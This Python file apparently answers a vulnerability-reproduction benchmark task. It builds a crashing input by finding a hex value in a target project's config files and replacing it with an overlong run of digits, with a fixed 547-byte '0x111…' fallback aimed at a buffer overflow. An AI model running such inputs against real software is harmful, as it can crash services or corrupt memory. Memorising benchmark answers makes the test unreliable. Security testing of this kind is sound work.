import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            poc = self._generate_from_config(src_path)
            if poc:
                return poc
        except Exception:
            pass
        return self._fallback_poc()

    def _fallback_poc(self) -> bytes:
        # 2 ("0x") + 544 ("1") + 1 ("\n") = 547 bytes
        return b"0x" + b"1" * 544 + b"\n"

    def _iter_files(self, src_path):
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, src_path)
                    try:
                        with open(full, 'rb') as f:
                            data = f.read()
                    except Exception:
                        continue
                    yield rel, data
        else:
            if tarfile.is_tarfile(src_path):
                try:
                    with tarfile.open(src_path, 'r:*') as tf:
                        for m in tf.getmembers():
                            if not m.isfile():
                                continue
                            if m.size > 1_000_000:
                                continue
                            f = None
                            try:
                                f = tf.extractfile(m)
                                if f is None:
                                    continue
                                data = f.read()
                            except Exception:
                                continue
                            finally:
                                if f is not None:
                                    try:
                                        f.close()
                                    except Exception:
                                        pass
                            yield m.name, data
                except Exception:
                    pass
            else:
                try:
                    with open(src_path, 'rb') as f:
                        data = f.read()
                    yield os.path.basename(src_path), data
                except Exception:
                    pass

    def _generate_from_config(self, src_path: str) -> bytes | None:
        hex_prefix_re = re.compile(br'0[xX][0-9a-fA-F]+')
        long_hex_re = re.compile(br'\b[0-9a-fA-F]{16,}\b')

        chosen = None

        # First pass: look for 0x-prefixed hex in likely config files
        for name, data in self._iter_files(src_path):
            if not data or len(data) > 1_000_000:
                continue
            lower_name = name.lower()
            is_candidate_ext = lower_name.endswith(
                ('.conf', '.cfg', '.ini', '.cnf', '.config', '.txt',
                 '.cfg.in', '.ini.in', '.yaml', '.yml', '.json',
                 '.properties', '.toml')
            )
            try:
                data_lower = data.lower()
            except Exception:
                data_lower = data
            if (not is_candidate_ext and
                    b'config' not in data_lower and
                    'conf' not in lower_name and
                    'config' not in lower_name and
                    'sample' not in lower_name and
                    'test' not in lower_name):
                continue

            lines = data.splitlines(keepends=True)
            for idx, line in enumerate(lines):
                m = hex_prefix_re.search(line)
                if m:
                    chosen = ('prefix', name, lines, idx, m)
                    break
            if chosen:
                break

        # Second pass: look for long pure-hex tokens if no 0x found
        if not chosen:
            for name, data in self._iter_files(src_path):
                if not data or len(data) > 1_000_000:
                    continue
                lower_name = name.lower()
                is_candidate_ext = lower_name.endswith(
                    ('.conf', '.cfg', '.ini', '.cnf', '.config', '.txt',
                     '.cfg.in', '.ini.in', '.yaml', '.yml', '.json',
                     '.properties', '.toml')
                )
                try:
                    data_lower = data.lower()
                except Exception:
                    data_lower = data
                if (not is_candidate_ext and
                        b'config' not in data_lower and
                        'conf' not in lower_name and
                        'config' not in lower_name and
                        'sample' not in lower_name and
                        'test' not in lower_name):
                    continue

                lines = data.splitlines(keepends=True)
                for idx, line in enumerate(lines):
                    m = long_hex_re.search(line)
                    if m:
                        chosen = ('pure', name, lines, idx, m)
                        break
                if chosen:
                    break

        if not chosen:
            return None

        kind, _name, lines, line_idx, m = chosen
        line = lines[line_idx]
        start, end = m.span()
        token = m.group()

        if kind == 'prefix':
            # token is b'0x' + hexdigits
            prefix = line[:start] + token[:2]
            suffix = line[end:]
            orig_len = max(len(token) - 2, 1)
            new_len = max(600, orig_len * 4)
            if new_len > 2000:
                new_len = 2000
            new_hex = b'1' * new_len
            new_line = prefix + new_hex + suffix
        else:
            # pure hex digits
            prefix = line[:start]
            suffix = line[end:]
            orig_len = max(len(token), 1)
            new_len = max(600, orig_len * 4)
            if new_len > 2000:
                new_len = 2000
            new_hex = b'1' * new_len
            new_line = prefix + new_hex + suffix

        lines[line_idx] = new_line
        new_data = b''.join(lines)
        if not new_data.endswith(b'\n'):
            new_data += b'\n'
        return new_data